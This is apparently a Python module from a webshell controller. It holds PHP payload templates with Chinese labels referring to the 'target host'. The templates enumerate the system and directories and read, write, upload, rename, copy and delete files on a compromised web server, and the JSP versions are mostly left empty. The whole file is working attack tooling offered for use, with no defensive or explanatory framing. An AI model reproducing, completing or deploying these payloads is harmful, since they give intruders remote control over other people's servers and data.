PHP_fileBaseCode='''echo "\n目标主机系统:";echo php_uname('s');'''
PHP_GETDIR = '''@@$handle=opendir('.');\
        echo "\n目录:----------------------\n";\
        while($file = readdir($handle)){echo "$file\n";}closedir($handle);'''
PHP_GETPATH = '''@@echo getcwd();'''
PHP_MKDIR = '''@@if(mkdir("##/")){echo 'done';}else{echo 'something err';}'''
PHP_RMDIR = '''@@if(rmdir("##/")){echo 'done';}else{echo 'something err';}'''
PHP_CD = '''@@'''
PHP_CHDIR = '''chdir("##");'''
PHP_READ = '''@@$ff=fopen("##","r");if(!$ff){echo "<br />加载失败 或无此文件<br />";\
        exit;}while(!feof($ff)){echo fgets($ff,256);}fclose($ff);'''
PHP_WRITE ='''@@$file="#1";$strtofile="#2";$ff=fopen($file, "w");if($ff){echo 'done';\
        fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''
PHP_WRITETO = '''@@if(file_put_contents("#1","#2",FILE_APPEND)){echo "done";}else{echo "something err";}'''
PHP_MKFILE = '''@@$file="##";$ff=fopen($file, "w");if($ff){echo 'done';}\
        else{echo 'something err';}fclose($ff);'''
PHP_DELETE = '''@@if(unlink("##")){echo 'done';}else{echo 'something err';}'''
PHP_RENAME = '''@@if(rename("#1","#2")){echo 'done';}else{echo 'something err';}'''
PHP_COPY = '''@@if(copy("#1","#2")){echo 'done';}else{echo 'something err';}'''

PHP_UPLOAD ='''@@$file="#1";$strtofile="#2";$ff=fopen($file, "w");if($ff){echo 'done';\
        fwrite($ff,$strtofile);}else{echo 'something err';}fclose($ff);'''

PHP_test = '''$ff=fopen("newfile.txt","r");echo fgets($ff,1024);'''


ASP_test = ''' '''
##################################################################################################

JSP_fileBaseCode=''''''
JSP_GETDIR = ''''''
JSP_GETPATH = '''path'''
JSP_MKDIR = ''''''
JSP_RMDIR = ''''''
JSP_CD = '''CD'''
JSP_CHDIR = '''changepath'''
JSP_READ = ''''''
JSP_WRITE =''''''
JSP_WRITETO = ''''''
JSP_MKFILE = ''''''
JSP_DELETE = ''''''
JSP_RENAME = ''''''
JSP_COPY = ''''''

JSP_UPLOAD =''''''

JSP_test = ''' '''